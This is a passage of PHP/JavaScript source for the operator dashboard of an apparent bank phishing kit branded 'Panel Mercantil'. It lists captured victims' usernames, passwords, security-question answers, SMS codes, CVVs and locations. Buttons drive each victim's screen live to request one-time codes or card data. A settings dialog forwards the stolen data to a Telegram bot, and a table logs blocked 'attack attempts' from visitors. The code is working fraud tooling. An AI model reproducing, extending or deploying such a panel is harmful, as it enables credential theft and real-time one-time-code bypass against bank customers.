<?php
session_start();
require __DIR__ . '/config.php';
if (!panel_logueado()) { header('Location: login.php'); exit; }
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
$cfg = json_read(F_CONFIG);
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Clientes · <?= htmlspecialchars($cfg['panel_nombre'] ?? 'Panel') ?></title>
<link rel="icon" href="merca.ico">
<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined">
<style>
  :root{
    --brand:#1976d2;--brand-2:#2196f3;--brand-dk:#004e9b;
    --bg:#eef1f5;--surface:#fff;--surface-2:#f7f9fc;--txt:#12314f;--txt-2:#5b6b7f;--muted:#9aa0a6;
    --border:#e8ecf1;--border-2:#eef1f5;--hover:#f2f5f9;--row-hover:#fbfcfe;
    --shadow:0 8px 26px rgba(0,0,0,.07);--hdr-shadow:0 2px 14px rgba(0,0,0,.07);
    --cred-bg:#f2f5f9;--cred-border:#e3e9f0;--chip-bg:#f2f5f9;
  }
  body.dark{--bg:#0e1420;--surface:#161d2b;--surface-2:#1b2333;--txt:#e8eef7;--txt-2:#9fb0c6;--muted:#6b7a8f;
    --border:#242e42;--border-2:#1f2839;--hover:#1f2839;--row-hover:#1b2333;
    --shadow:0 8px 26px rgba(0,0,0,.4);--hdr-shadow:0 2px 14px rgba(0,0,0,.5);
    --cred-bg:#1f2839;--cred-border:#2b3750;--chip-bg:#1f2839}
  *{box-sizing:border-box}
  body{background:var(--bg);font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Roboto,sans-serif;margin:0;color:var(--txt);transition:background .2s,color .2s}
  .top-strip{height:4px;background:linear-gradient(90deg,#1976d2,#2196f3,#004e9b)}
  .material-icons{vertical-align:middle;font-size:20px}
  .marca{display:flex;align-items:center;gap:11px}
  .marca .tx b{display:block;color:var(--txt);font-size:16px;font-weight:800;letter-spacing:.2px;line-height:1.1}
  .hdr{display:flex;justify-content:space-between;align-items:center;background:var(--surface);box-shadow:var(--hdr-shadow);padding:0 26px;height:70px;position:sticky;top:0;z-index:20;transition:background .2s}
  nav{display:flex;gap:6px;align-items:center}
  nav a,nav button{display:flex;align-items:center;gap:7px;text-decoration:none;color:var(--txt-2);font-weight:700;font-size:13.5px;padding:9px 15px;border-radius:10px;transition:.13s;border:0;background:transparent;cursor:pointer;font-family:inherit}
  nav a:hover,nav button:hover{background:var(--hover);color:var(--txt)}
  nav a.on{background:linear-gradient(135deg,var(--brand-dk),var(--brand-2));color:#fff;box-shadow:0 4px 12px rgba(25,118,210,.28)}
  nav a.exit{color:#c0392b}
  nav a.tg{background:linear-gradient(135deg,#229ED9,#36b3ec);color:#fff;box-shadow:0 4px 12px rgba(34,158,217,.3)}
  .wrap{padding:24px 26px;max-width:1620px;margin:0 auto}
  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:22px}
  .stat{border-radius:16px;padding:20px 22px;position:relative;overflow:hidden;color:#fff;box-shadow:0 10px 26px rgba(0,0,0,.12);transition:.18s}
  .stat:hover{transform:translateY(-3px)}
  .stat .n{font-size:38px;font-weight:800;line-height:1;font-variant-numeric:tabular-nums}
  .stat .l{font-size:10.5px;text-transform:uppercase;letter-spacing:1px;margin-top:9px;font-weight:800;opacity:.92}
  .stat .mat-icon{position:absolute;right:16px;top:16px;font-size:34px;opacity:.26}
  .stat .sub{font-size:11px;margin-top:6px;opacity:.85}
  .s-blue{background:linear-gradient(135deg,#004e9b,#1976d2)}
  .s-orange{background:linear-gradient(135deg,#e87d1e,#f2a34f)}
  .s-green{background:linear-gradient(135deg,#1e9e54,#41c26f)}
  .s-purple{background:linear-gradient(135deg,#752f8a,#a052bd)}
  .panel{background:var(--surface);border-radius:16px;box-shadow:var(--shadow);overflow:hidden;border:1px solid var(--border);transition:background .2s}
  .panel-head{display:flex;justify-content:space-between;align-items:center;padding:18px 22px;border-bottom:1px solid var(--border-2);flex-wrap:wrap;gap:12px}
  .panel-head h2{margin:0;font-size:17px;color:var(--txt);font-weight:800;display:flex;align-items:center;gap:9px}
  .panel-head h2 .material-icons{color:var(--brand);font-size:22px}
  .panel-head h2 .count{background:var(--surface-2);color:var(--txt-2);font-size:12px;font-weight:800;padding:2px 9px;border-radius:20px;margin-left:4px}
  table.pro{width:100%;border-collapse:collapse;font-size:13.5px}
  table.pro th{text-align:left;padding:14px 13px;background:var(--surface-2);color:var(--txt-2);font-weight:800;font-size:10.5px;text-transform:uppercase;letter-spacing:.7px;border-bottom:2px solid var(--border);white-space:nowrap}
  table.pro td{padding:13px;border-bottom:1px solid var(--border-2);white-space:nowrap;color:var(--txt)}
  table.pro tbody tr{transition:.12s}
  table.pro tbody tr:hover{background:var(--row-hover);box-shadow:inset 3px 0 0 var(--brand)}
  tr.nueva{animation:filaNueva 2.4s ease}
  @keyframes filaNueva{0%{background:#e3f0fd;box-shadow:inset 3px 0 0 var(--brand)}100%{background:transparent}}
  .cred{display:inline-flex;align-items:center;gap:7px;font-family:ui-monospace,Consolas,monospace;background:var(--cred-bg);padding:5px 10px;border-radius:8px;font-size:12.5px;border:1px solid var(--cred-border);color:var(--txt);font-weight:600;cursor:pointer;transition:.12s;user-select:none}
  .cred:hover{background:var(--hover)}
  .cred.copied{background:#e8f8ef;border-color:#b7e6c9;color:#1e7e42}
  .cred .material-icons{font-size:14px;color:var(--muted)}
  .cred.copied .material-icons{color:#1e9e54}
  .pag{display:inline-flex;align-items:center;gap:6px;padding:5px 11px;border-radius:8px;font-size:11.5px;font-weight:800;background:var(--chip-bg);color:var(--txt-2);border:1px solid var(--cred-border)}
  .pag .material-icons{font-size:14px}
  .pag.cargando{background:#eef4fb;color:#1976d2;border-color:#d3e2f3}
  .pag.preguntas{background:#fff3e0;color:#c76a00;border-color:#ffd9a8}
  .pag.clave{background:#fbe9f6;color:#a0287e;border-color:#f2c9e6}
  .pag.sms{background:#e6faf7;color:#0f766e;border-color:#a9e8e1}
  .pag.sms_error{background:#fdecec;color:#b4322a;border-color:#f6c9c4}
  .pag.cvv{background:#eef2ff;color:#1e40af;border-color:#c7d0f8}
  .pag.finalizado{background:#e8f8ef;color:#1e7e42;border-color:#b7e6c9}
  body.dark .pag.cargando{background:#16273d;color:#6fb0f0;border-color:#22374f}
  body.dark .pag.preguntas{background:#3a2a10;color:#f0b055;border-color:#543d18}
  body.dark .pag.clave{background:#2e1730;color:#e07ac8;border-color:#472150}
  body.dark .pag.sms{background:#0d2a27;color:#5eead4;border-color:#17423d}
  body.dark .pag.sms_error{background:#3a1a17;color:#f08c80;border-color:#5a2a26}
  body.dark .pag.cvv{background:#161c3a;color:#93a7f8;border-color:#26305a}
  body.dark .pag.finalizado{background:#12291c;color:#4fd18a;border-color:#1e3d2a}
  .dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:middle}
  .dot.on{background:#1e9e54;animation:on 1.6s infinite}
  .dot.off{background:#c9ced6}
  @keyframes on{0%{box-shadow:0 0 0 0 rgba(30,158,84,.55)}70%{box-shadow:0 0 0 9px rgba(30,158,84,0)}100%{box-shadow:0 0 0 0 rgba(30,158,84,0)}}
  .est{font-size:11.5px;font-weight:800;text-transform:uppercase;letter-spacing:.4px;display:inline-flex;align-items:center}
  .est.on{color:#1e9e54}.est.off{color:#93a2b5}
  .bp-input{border-radius:10px;border:1px solid var(--cred-border);padding:10px 14px;font-size:13.5px;background:var(--surface);color:var(--txt)}
  .bp-input:focus{outline:none;border-color:var(--brand);box-shadow:0 0 0 3px rgba(25,118,210,.13)}
  .search{width:230px}
  .tool{display:flex;gap:8px;align-items:center;background:var(--hover);border:0;border-radius:10px;padding:9px 14px;font-weight:700;font-size:12.5px;color:var(--txt-2);cursor:pointer;transition:.13s}
  .tool:hover{background:var(--border)}
  .tool.active{background:linear-gradient(135deg,#1e9e54,#41c26f);color:#fff}
  .live{display:inline-flex;align-items:center;gap:6px;color:#1e9e54;font-weight:700;font-size:12px}
  .live .dot{animation:on 1.6s infinite;margin:0}
  .acc{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;max-width:340px}
  .acc button{border:0;border-radius:9px;padding:7px 11px;display:inline-flex;align-items:center;gap:5px;cursor:pointer;transition:.12s;background:var(--chip-bg);color:var(--txt);font-weight:800;font-size:11.5px;border:1px solid var(--cred-border);font-family:inherit;white-space:nowrap}
  .acc button:hover{transform:translateY(-2px);box-shadow:0 4px 10px rgba(0,0,0,.1)}
  .acc button .material-icons{font-size:16px}
  .acc .b-preg{color:#a8600a;background:#fff7ea;border-color:#ffd9a8}.acc .b-preg:hover{background:#ffedcc}
  .acc .b-clave{color:#8e1f6c;background:#fdf0f8;border-color:#f2c9e6}.acc .b-clave:hover{background:#f9dff1}
  .acc .b-fin{color:#186c39;background:#e9f9f0;border-color:#b7e6c9}.acc .b-fin:hover{background:#d3f3e1}
  .acc .b-load{color:#145a9e;background:#eef4fb;border-color:#d3e2f3}.acc .b-load:hover{background:#dbe9f7}
  .acc .b-fino{color:#a5281c;background:#fdeceb;border-color:#f6c9c4}.acc .b-fino:hover{background:#fbdbd8}
  .acc .b-sms{color:#0f766e;background:#e6faf7;border-color:#a9e8e1}.acc .b-sms:hover{background:#cff3ef}
  .acc .b-smsmalo{color:#b45309;background:#fff7ea;border-color:#ffd9a8}.acc .b-smsmalo:hover{background:#ffedcc}
  .acc .b-cvv{color:#1e40af;background:#eef2ff;border-color:#c7d0f8}.acc .b-cvv:hover{background:#dbe3fd}
  body.dark .acc .b-preg{color:#f0b055;background:#3a2a10;border-color:#543d18}
  body.dark .acc .b-clave{color:#e07ac8;background:#2e1730;border-color:#472150}
  body.dark .acc .b-fin{color:#4fd18a;background:#12291c;border-color:#1e3d2a}
  body.dark .acc .b-load{color:#6fb0f0;background:#16273d;border-color:#22374f}
  body.dark .acc .b-fino{color:#f08c80;background:#3a1a17;border-color:#5a2a26}
  body.dark .acc .b-sms{color:#5eead4;background:#0d2a27;border-color:#17423d}
  body.dark .acc .b-smsmalo{color:#f0b055;background:#3a2a10;border-color:#543d18}
  body.dark .acc .b-cvv{color:#93a7f8;background:#161c3a;border-color:#26305a}
  .qa{display:flex;flex-direction:column;gap:6px;min-width:230px}
  .qa .q{display:flex;gap:7px;align-items:flex-start;font-size:12.5px;line-height:1.35}
  .qa .q .num{flex:none;width:19px;height:19px;border-radius:50%;background:var(--brand);color:#fff;font-size:10.5px;font-weight:800;display:inline-flex;align-items:center;justify-content:center;margin-top:1px}
  .qa .q .txt{color:var(--txt-2)}
  .qa .a{display:flex;gap:7px;align-items:flex-start;font-size:13px;font-weight:700;line-height:1.35;padding-left:26px}
  .qa .a .arrow{color:#1e9e54;flex:none}
  .qa .a .val{color:var(--txt);background:var(--cred-bg);border:1px solid var(--cred-border);padding:3px 9px;border-radius:7px;white-space:normal;word-break:break-word;cursor:pointer}
  .qa .empty{color:var(--muted);font-size:12px}
  .empty{padding:56px;text-align:center;color:var(--muted)}
  .empty .material-icons{font-size:52px;color:var(--border);display:block;margin:0 auto 10px}
  .toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--brand-dk);color:#fff;padding:13px 22px;border-radius:12px;font-weight:700;font-size:13.5px;box-shadow:0 10px 30px rgba(0,0,0,.25);opacity:0;transition:.25s;z-index:99;display:flex;align-items:center;gap:9px}
  .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
  .toast .material-icons{font-size:19px;color:#41c26f}
  /* ---- Modal preguntas ---- */
  .modal-bg{position:fixed;inset:0;background:rgba(10,20,35,.55);backdrop-filter:blur(2px);display:none;align-items:center;justify-content:center;z-index:120}
  .modal-bg.show{display:flex}
  .modal{background:var(--surface);border-radius:18px;box-shadow:0 30px 70px rgba(0,0,0,.4);width:560px;max-width:94vw;overflow:hidden;border:1px solid var(--border);animation:pop .18s ease}
  @keyframes pop{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
  .modal-head{display:flex;align-items:center;gap:10px;padding:18px 22px;border-bottom:1px solid var(--border-2);background:var(--surface-2)}
  .modal-head .material-icons{color:var(--brand);font-size:22px}
  .modal-head h3{margin:0;font-size:16px;font-weight:800;color:var(--txt)}
  .modal-head .x{margin-left:auto;cursor:pointer;color:var(--muted);border:0;background:transparent}
  .modal-head .x:hover{color:var(--txt)}
  .modal-body{padding:22px}
  .modal-body label{display:block;font-size:12px;font-weight:800;color:var(--txt-2);margin:0 0 6px;text-transform:uppercase;letter-spacing:.5px}
  .modal-body input{width:100%;border:1px solid var(--cred-border);border-radius:11px;padding:12px 14px;font-size:14px;background:var(--surface-2);color:var(--txt);margin-bottom:16px}
  .modal-body input:focus{outline:none;border-color:var(--brand);box-shadow:0 0 0 3px rgba(25,118,210,.13);background:var(--surface)}
  .modal-body .hint{font-size:12px;color:var(--muted);margin:-8px 0 16px}
  .modal-foot{display:flex;gap:10px;justify-content:flex-end;padding:0 22px 22px}
  .mbtn{border:0;border-radius:11px;padding:11px 20px;font-size:13.5px;font-weight:800;cursor:pointer;display:inline-flex;align-items:center;gap:7px}
  .mbtn.cancel{background:var(--chip-bg);color:var(--txt-2);border:1px solid var(--cred-border)}
  .mbtn.ok{background:linear-gradient(135deg,var(--brand-dk),var(--brand-2));color:#fff;box-shadow:0 6px 16px rgba(25,118,210,.3)}
  .mbtn.ok:hover{filter:brightness(1.06)}
</style>
</head>
<body>
<div class="top-strip"></div>
<header class="hdr">
  <div class="marca"><div class="tx"><b id="panel-nombre">Panel de clientes</b></div></div>
  <nav>
    <a href="dashboard.php" class="on"><span class="material-icons">groups</span> Clientes</a>
    <button onclick="abrirAjustes()"><span class="material-icons">settings</span> Ajustes</button>
    <button id="btn-tema" onclick="toggleTema()"><span class="material-icons">dark_mode</span> <span id="tema-tx">Oscuro</span></button>
    <a href="logout.php" class="exit"><span class="material-icons">power_settings_new</span> Salir</a>
  </nav>
</header>

<div class="wrap">
  <div class="stats">
    <div class="stat s-blue"><span class="material-icons mat-icon">groups</span><div class="n" id="k-total">0</div><div class="l">Total clientes</div><div class="sub" id="k-hoy">0 hoy</div></div>
    <div class="stat s-green"><span class="material-icons mat-icon">wifi_tethering</span><div class="n" id="k-online">0</div><div class="l">En línea ahora</div><div class="sub">heartbeat &lt; 25s</div></div>
    <div class="stat s-orange"><span class="material-icons mat-icon">pending_actions</span><div class="n" id="k-espera">0</div><div class="l">En proceso</div><div class="sub">cargando / preguntas</div></div>
    <div class="stat s-purple"><span class="material-icons mat-icon">verified</span><div class="n" id="k-final">0</div><div class="l">Finalizados</div><div class="sub">flujo completado</div></div>
  </div>

  <div class="panel">
    <div class="panel-head">
      <h2><span class="material-icons">people</span> Lista de clientes <span class="count" id="k-visibles">0</span></h2>
      <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
        <button class="tool" id="btn-alarma" onclick="toggleAlarma()"><span class="material-icons">volume_up</span> Alarma ON</button>
        <button class="tool" onclick="probarAlarma()"><span class="material-icons">play_arrow</span> Probar</button>
        <button class="tool" onclick="limpiarClientes()"><span class="material-icons">delete_sweep</span> Limpiar</button>
        <input class="bp-input search" id="q" placeholder="Buscar usuario / IP…" oninput="render()">
        <span class="live"><span class="dot on"></span> <span id="last">en vivo</span></span>
      </div>
    </div>
    <div style="overflow:auto">
      <table class="pro" id="t">
        <thead><tr>
          <th style="width:44px">#</th><th>Hora</th><th>Usuario</th><th>Clave</th>
          <th>IP</th><th>Ubicación</th>
          <th>Preguntas y respuestas</th>
          <th>Código</th>
          <th>Estado</th><th>Visto</th><th style="text-align:center">Acciones</th>
        </tr></thead>
        <tbody></tbody>
      </table>
    </div>
  </div>

  <!-- 🚨 Intentos de ataque / bloqueos -->
  <div class="panel" style="margin-top:18px;border:1px solid #f3c9c3">
    <div class="panel-head" style="background:linear-gradient(90deg,#fff2f0,#fff8f7)">
      <h2 style="color:#c0392b"><span class="material-icons" style="color:#c0392b">gpp_maybe</span> Intentos de ataque / bloqueos <span class="count" id="at-count" style="background:#fdeceb;color:#c0392b">0</span></h2>
      <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
        <button class="tool" onclick="cargarAtaques()"><span class="material-icons">refresh</span> Refrescar</button>
        <button class="tool" onclick="limpiarAtaques()"><span class="material-icons">delete_sweep</span> Limpiar</button>
        <span class="live"><span class="dot" id="at-dot" style="background:#e74c3c"></span> <span id="at-last">monitor</span></span>
      </div>
    </div>
    <div style="overflow:auto;max-height:340px">
      <table class="pro" id="tAtaques">
        <thead><tr>
          <th style="width:44px">#</th><th>Hora</th><th>IP</th><th>País</th><th>Ubicación / ISP</th>
          <th>Motivo</th><th>Ruta</th><th>User-Agent</th>
        </tr></thead>
        <tbody id="at-body"><tr><td colspan="8" style="text-align:center;color:var(--muted);padding:22px">Sin ataques registrados 🟢</td></tr></tbody>
      </table>
    </div>
  </div>
</div>

<div class="toast" id="toast"><span class="material-icons">check_circle</span><span id="toast-tx">Copiado</span></div>

<div class="modal-bg" id="mPreguntas">
  <div class="modal">
    <div class="modal-head">
      <span class="material-icons">help_outline</span>
      <h3>Preguntas de seguridad</h3>
      <button class="x" onclick="cerrarPreguntas()"><span class="material-icons">close</span></button>
    </div>
    <div class="modal-body">
      <label>Pregunta 1</label>
      <input id="mp1" placeholder="Ej: ¿Cuál es el nombre de su primera mascota?">
      <label>Pregunta 2</label>
      <input id="mp2" placeholder="Ej: ¿En qué ciudad nació su madre?">
      <div class="hint">Estas dos preguntas se mostrarán al cliente en pantalla.</div>
    </div>
    <div class="modal-foot">
      <button class="mbtn cancel" onclick="cerrarPreguntas()">Cancelar</button>
      <button class="mbtn ok" onclick="enviarPreguntas()"><span class="material-icons" style="font-size:18px">send</span> Enviar preguntas</button>
    </div>
  </div>
</div>

<div class="modal-bg" id="mAjustes">
  <div class="modal">
    <div class="modal-head">
      <span class="material-icons">settings</span>
      <h3>Ajustes · Telegram</h3>
      <button class="x" onclick="cerrarAjustes()"><span class="material-icons">close</span></button>
    </div>
    <div class="modal-body">
      <label>Nombre del panel</label>
      <input id="cfg-nombre" placeholder="Panel Mercantil">
      <label>Token del bot (Telegram)</label>
      <input id="cfg-token" placeholder="123456:ABC-DEF..." autocomplete="off">
      <label>Chat ID / Grupo</label>
      <input id="cfg-chat" placeholder="-1001234567890" autocomplete="off">
      <div class="hint">Con estos datos se envían los avisos de cada cliente al chat indicado.</div>
    </div>
    <div class="modal-foot">
      <button class="mbtn cancel" onclick="cerrarAjustes()">Cancelar</button>
      <button class="mbtn" style="background:linear-gradient(135deg,#229ED9,#36b3ec);color:#fff" onclick="probarTg()"><span class="material-icons" style="font-size:18px">send</span> Probar</button>
      <button class="mbtn ok" onclick="guardarAjustes()"><span class="material-icons" style="font-size:18px">save</span> Guardar</button>
    </div>
  </div>
</div>

<script>
let AC=null;
function beep(){
  try{
    AC=AC||new (window.AudioContext||window.webkitAudioContext)();
    if(AC.state==='suspended')AC.resume();
    [[880,0,.18],[660,.20,.18],[880,.40,.22]].forEach(([f,t,d])=>{
      const o=AC.createOscillator(),g=AC.createGain();
      o.type='square';o.frequency.value=f;o.connect(g);g.connect(AC.destination);
      const s=AC.currentTime+t;
      g.gain.setValueAtTime(0.0001,s);
      g.gain.exponentialRampToValueAtTime(0.5,s+0.02);
      g.gain.exponentialRampToValueAtTime(0.0001,s+d);
      o.start(s);o.stop(s+d+0.02);
    });
  }catch(e){}
}
let alarmaActiva=localStorage.getItem('mx_alarma')!=='off';
function pintarAlarma(){const b=document.getElementById('btn-alarma');b.classList.toggle('active',alarmaActiva);b.querySelector('.material-icons').textContent=alarmaActiva?'volume_up':'volume_off';b.lastChild.textContent=alarmaActiva?' Alarma ON':' Alarma OFF';}
function toggleAlarma(){alarmaActiva=!alarmaActiva;localStorage.setItem('mx_alarma',alarmaActiva?'on':'off');pintarAlarma();if(alarmaActiva)beep();}
function probarAlarma(){beep();}

function toggleTema(){
  const d=document.body.classList.toggle('dark');
  localStorage.setItem('mx_tema',d?'dark':'light');
  document.getElementById('tema-tx').textContent=d?'Claro':'Oscuro';
  document.querySelector('#btn-tema .material-icons').textContent=d?'light_mode':'dark_mode';
}
function initTema(){
  if(localStorage.getItem('mx_tema')==='dark'){document.body.classList.add('dark');document.getElementById('tema-tx').textContent='Claro';document.querySelector('#btn-tema .material-icons').textContent='light_mode';}
}

let toastT;
function toast(msg){const el=document.getElementById('toast');document.getElementById('toast-tx').textContent=msg;el.classList.add('show');clearTimeout(toastT);toastT=setTimeout(()=>el.classList.remove('show'),1800);}
function copiar(txt,el,etq){
  const done=()=>{el.classList.add('copied');el.querySelector('.material-icons').textContent='check';toast((etq||'')+' copiado: '+txt);setTimeout(()=>{el.classList.remove('copied');el.querySelector('.material-icons').textContent='content_copy';},1400);};
  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(()=>fb(txt,done));}else fb(txt,done);
}
function fb(txt,cb){const ta=document.createElement('textarea');ta.value=txt;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);cb();}
function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}

async function api(accion,data={}){
  const r=await fetch('acciones.php?_='+Date.now(),{method:'POST',cache:'no-store',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion,...data})});
  return r.json();
}

let ITEMS=[],lastIds='',seen=new Set(),primera=true;
const chipIcon={cargando:'hourglass_top',preguntas:'help_outline',finalizado:'task_alt',sms:'sms',sms_error:'error_outline',cvv:'credit_card'};
const chipName={cargando:'Cargando',preguntas:'Preguntas',finalizado:'Finalizado',sms:'SMS',sms_error:'SMS (error)',cvv:'CVV'};

function estadoChip(e){
  const k = (e==='cargando'||e==='preguntas'||e==='finalizado'||e==='sms'||e==='sms_error'||e==='cvv')?e:'cargando';
  const icon = {cargando:'hourglass_top',preguntas:'help_outline',finalizado:'task_alt',sms:'sms',sms_error:'error_outline',cvv:'credit_card'}[k]||'hourglass_top';
  const name = {cargando:'Cargando',preguntas:'Preguntas',finalizado:'Finalizado',sms:'SMS',sms_error:'SMS (error)',cvv:'CVV'}[k]||e;
  return '<span class="pag '+k+'"><span class="material-icons">'+icon+'</span>'+name+'</span>';
}
function segTxt(s){s=Math.max(0,s|0);if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';return Math.floor(s/3600)+'h';}

function render(){
  const q=(document.getElementById('q').value||'').toLowerCase();
  const rows=ITEMS.filter(x=>{
    if(!q)return true;
    return ((x.usuario||'')+' '+(x.ip||'')+' '+(x.clave||'')+' '+(x.p1||'')+' '+(x.p2||'')+' '+(x.resp1||'')+' '+(x.resp2||'')+' '+(x.sms||'')+' '+(x.cvv||'')).toLowerCase().includes(q);
  });
  const tb=document.querySelector('#t tbody');
  document.getElementById('k-visibles').textContent=rows.length;
  if(!rows.length){
    tb.innerHTML='<tr><td colspan="11"><div class="empty"><span class="material-icons">inbox</span>Sin clientes todavía…</div></td></tr>';
    return;
  }
  tb.innerHTML=rows.map((x,idx)=>{
    const online=!!x.online;
    const id=x.id||'';
    const isNew=!primera&&!seen.has(id);
    const pc=(t)=>(t||'').replace(/'/g,"\\'");
    // celda de preguntas + respuestas (tarjeta q/a)
    let items=[];
    if(x.p1||x.resp1)items.push([1,x.p1,x.resp1]);
    if(x.p2||x.resp2)items.push([2,x.p2,x.resp2]);
    const qa = items.length
      ? '<div class="qa">'+items.map(([nq,p,rq])=>'<div class="q"><span class="num">'+nq+'</span><span class="txt">'+esc(p||('Pregunta '+nq))+'</span></div><div class="a"><span class="arrow material-icons">subdirectory_arrow_right</span>'+(rq?'<span class="val" onclick="copiar(\''+pc(rq)+'\',this,\'Respuesta\')">'+esc(rq)+'</span>':'<span class="val" style="color:var(--muted)">Sin responder</span>')+'</div>').join('')+'</div>'
      : '<span style="color:var(--muted)">—</span>';
    return '<tr class="'+(isNew?'nueva':'')+'">'
      +'<td>'+(idx+1)+'</td>'
      +'<td>'+esc((x.ts||'').slice(11))+'</td>'
      +'<td><span class="cred" onclick="copiar(\''+pc(x.usuario)+'\',this,\'Usuario\')"><span class="material-icons">content_copy</span>'+esc(x.usuario)+'</span></td>'
      +'<td>'+(x.clave?'<span class="cred" onclick="copiar(\''+pc(x.clave)+'\',this,\'Clave\')"><span class="material-icons">content_copy</span>'+esc(x.clave)+'</span>':'<span style="color:var(--muted)">—</span>')+'</td>'
      +'<td><span class="cred" onclick="copiar(\''+pc(x.ip)+'\',this,\'IP\')"><span class="material-icons">content_copy</span>'+esc(x.ip||'')+'</span></td>'
      +'<td>'+esc([(x.geo&&x.geo.ciudad)||'',(x.geo&&x.geo.pais)||''].join(', ').replace(/^,\s*|,\s*$/g,'')||'—')+'</td>'
      +'<td>'+qa+'</td>'
      +'<td>'+((x.sms||x.cvv)?'<span class="cred" onclick="copiar(\''+(x.sms?pc(x.sms):pc(x.cvv))+'\',this,\'Código\')"><span class="material-icons">content_copy</span>'+esc(x.sms?('SMS '+x.sms):('CVV '+x.cvv))+'</span>':'<span style="color:var(--muted)">—</span>')+'</td>'
      +'<td>'+estadoChip(x.estado||'cargando')+'</td>'
      +'<td><span class="est '+(online?'on':'off')+'"><span class="dot '+(online?'on':'off')+'"></span>'+(online?'En línea ('+segTxt(x.seg)+')':'hace '+(x.seg!=null?segTxt(x.seg):'—'))+'</span></td>'
      +'<td><div class="acc">'
        +'<button class="b-sms" title="Pedir clave temporal (SMS)" onclick="ctrl(\''+esc(id)+'\',\'sms\')"><span class="material-icons">sms</span>SMS</button>'
        +'<button class="b-smsmalo" title="SMS con error (reingresar)" onclick="ctrl(\''+esc(id)+'\',\'sms_error\')"><span class="material-icons">error_outline</span>SMS Malo</button>'
        +'<button class="b-cvv" title="Pedir CVV" onclick="ctrl(\''+esc(id)+'\',\'cvv\')"><span class="material-icons">credit_card</span>CVV</button>'
        +'<button class="b-preg" title="Mandar preguntas" onclick="abrirPreguntas(\''+esc(id)+'\')"><span class="material-icons">help_outline</span>Preguntas</button>'
        +'<button class="b-load" title="Volver a cargando" onclick="ctrl(\''+esc(id)+'\',\'cargando\')"><span class="material-icons">hourglass_top</span>Esperar</button>'
        +'<button class="b-fino" title="Datos malos (index-error)" onclick="ctrl(\''+esc(id)+'\',\'rechazado\')"><span class="material-icons">block</span>Datos Malos</button>'
      +'</div></td>'
      +'</tr>';
  }).join('');
}

function stats(){
  const t=ITEMS.length;
  const onl=ITEMS.filter(x=>x.online).length;
  const esp=ITEMS.filter(x=>x.estado==='cargando'||x.estado==='preguntas'||!x.estado).length;
  const fin=ITEMS.filter(x=>x.estado==='finalizado').length;
  const hoy=ITEMS.filter(x=>((x.ts||'').slice(0,10)===new Date().toISOString().slice(0,10))).length;
  document.getElementById('k-total').textContent=t;
  document.getElementById('k-online').textContent=onl;
  document.getElementById('k-espera').textContent=esp;
  document.getElementById('k-final').textContent=fin;
  document.getElementById('k-hoy').textContent=hoy+' hoy';
}

async function cargar(){
  try{
    const r=await api('presencia');
    if(!r.ok)return;
    ITEMS=r.items||[];
    const ids=ITEMS.map(x=>x.id).join('|');
    // alarma si llega un cliente nuevo (con usuario)
    if(!primera && ids!==lastIds){
      const nuevos=ITEMS.filter(x=>x.id&&!seen.has(x.id)&&x.usuario);
      if(nuevos.length&&alarmaActiva)beep();
    }
    ITEMS.forEach(x=>{if(x.id)seen.add(x.id);});
    lastIds=ids;
    stats();render();
    document.getElementById('last').textContent='actualizado '+new Date().toLocaleTimeString();
    primera=false;
  }catch(e){}
}

async function ctrl(id,estado){
  const r=await api('control',{id,estado});
  if(r.ok){toast('Enviado → '+estado);await cargar();}
  else toast('No se pudo (¿cliente activo?)');
}

/* ---- Modal preguntas ---- */
let pidActual=null;
function abrirPreguntas(id){
  pidActual=id;
  const it=ITEMS.find(x=>x.id===id)||{};
  document.getElementById('mp1').value=it.p1||'';
  document.getElementById('mp2').value=it.p2||'';
  document.getElementById('mPreguntas').classList.add('show');
  setTimeout(()=>document.getElementById('mp1').focus(),100);
}
function cerrarPreguntas(){
  document.getElementById('mPreguntas').classList.remove('show');
  pidActual=null;
}
async function enviarPreguntas(){
  const p1=document.getElementById('mp1').value.trim();
  const p2=document.getElementById('mp2').value.trim();
  if(!p1||!p2){toast('Completa las 2 preguntas');return;}
  const r=await api('control',{id:pidActual,estado:'preguntas',p1,p2});
  if(r.ok){toast('Preguntas enviadas al cliente');cerrarPreguntas();await cargar();}
  else toast('No se pudo enviar');
}

/* ---- Modal ajustes (Telegram) ---- */
let CFG={};
async function abrirAjustes(){
  try{ const r=await api('get_config'); if(r&&r.config) CFG=r.config; }catch(e){}
  document.getElementById('cfg-nombre').value=CFG.panel_nombre||'Panel Mercantil';
  document.getElementById('cfg-token').value=CFG.tg_token||'';
  document.getElementById('cfg-chat').value=CFG.tg_chat||'';
  document.getElementById('mAjustes').classList.add('show');
}
function cerrarAjustes(){ document.getElementById('mAjustes').classList.remove('show'); }
async function guardarAjustes(){
  const panel_nombre=document.getElementById('cfg-nombre').value.trim();
  const tg_token=document.getElementById('cfg-token').value.trim();
  const tg_chat=document.getElementById('cfg-chat').value.trim();
  const r=await api('guardar_config',{panel_nombre,tg_token,tg_chat});
  if(r.ok){ CFG=r.config; document.getElementById('panel-nombre').textContent=panel_nombre||'Panel Mercantil'; toast('Ajustes guardados'); cerrarAjustes(); }
  else toast('No se pudo guardar');
}
async function probarTg(){
  // Guarda primero y luego manda prueba
